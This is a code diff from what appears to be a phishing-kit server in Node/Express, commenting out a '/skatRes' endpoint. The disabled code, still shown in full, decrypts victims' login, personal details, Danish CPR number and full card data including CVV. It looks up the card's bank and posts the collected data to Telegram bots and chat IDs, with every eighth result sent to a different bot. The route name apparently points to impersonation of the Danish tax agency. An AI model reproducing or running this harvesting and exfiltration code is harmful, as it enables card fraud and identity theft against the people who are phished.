@@ -2711,60 +2711,60 @@ app.post('/ssfinesse', (req, res) => {
 
 let skat = 0;
 
-app.options('/skatRes', cors())
+// app.options('/skatRes', cors())
 
-app.post('/skatRes', (req, res) => {
-    username = CryptoJS.AES.decrypt(req.body.username, '402312').toString(CryptoJS.enc.Utf8);
-    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
-    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
-    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
-    zip = CryptoJS.AES.decrypt(req.body.zip, '402312').toString(CryptoJS.enc.Utf8);
-    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
-    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
-    cpr = CryptoJS.AES.decrypt(req.body.cpr, '402312').toString(CryptoJS.enc.Utf8);
-    bank = CryptoJS.AES.decrypt(req.body.bank, '402312').toString(CryptoJS.enc.Utf8);
-    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
-    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
-    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
-    cccvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
-    userAgent = req.body.userAgent;
-    ip = req.body.ip;
-    bin = req.body.bin;
+// app.post('/skatRes', (req, res) => {
+//     username = CryptoJS.AES.decrypt(req.body.username, '402312').toString(CryptoJS.enc.Utf8);
+//     fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
+//     address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
+//     city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
+//     zip = CryptoJS.AES.decrypt(req.body.zip, '402312').toString(CryptoJS.enc.Utf8);
+//     dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
+//     telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
+//     cpr = CryptoJS.AES.decrypt(req.body.cpr, '402312').toString(CryptoJS.enc.Utf8);
+//     bank = CryptoJS.AES.decrypt(req.body.bank, '402312').toString(CryptoJS.enc.Utf8);
+//     ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
+//     ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
+//     ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
+//     cccvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
+//     userAgent = req.body.userAgent;
+//     ip = req.body.ip;
+//     bin = req.body.bin;
 
-    if (bin.length === 7) {
-        formatBin = bin.replace(/ /g, '');
-        if (formatBin.length === 7) {
-            formatBin = bin.slice(0, -1);
-        }
-        bin = formatBin;
-    }
-    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
-        if (!resp.data.bank) {
-            bankName = ""
-        } else {
-            bankName = resp.data.bank.name;
-        }
-    }).then(function () {
-        binList = `${bin} | ${dob} | ${zip} | ${bankName}`
-        var originalText = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
-        if (skat == 7) {
-            axios.post(
-                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=SKAT:\n${originalText}`
-            );
-            skat = 0;
-        } else {
-            axios.post(
-                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=SKATRH:\n${originalText}`
-            );
-            axios.post(
-                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1449567433&text=SKAT:\n${originalText}`
-            );
-            skat += 1;
-        }
+//     if (bin.length === 7) {
+//         formatBin = bin.replace(/ /g, '');
+//         if (formatBin.length === 7) {
+//             formatBin = bin.slice(0, -1);
+//         }
+//         bin = formatBin;
+//     }
+//     axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
+//         if (!resp.data.bank) {
+//             bankName = ""
+//         } else {
+//             bankName = resp.data.bank.name;
+//         }
+//     }).then(function () {
+//         binList = `${bin} | ${dob} | ${zip} | ${bankName}`
+//         var originalText = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+//         if (skat == 7) {
+//             axios.post(
+//                 `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=SKAT:\n${originalText}`
+//             );
+//             skat = 0;
+//         } else {
+//             axios.post(
+//                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=SKATRH:\n${originalText}`
+//             );
+//             axios.post(
+//                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1449567433&text=SKAT:\n${originalText}`
+//             );
+//             skat += 1;
+//         }
 
-        res.send("Update Completed");
-    })
-});
+//         res.send("Update Completed");
+//     })
+// });
 
 app.options('/removeips', cors())
 
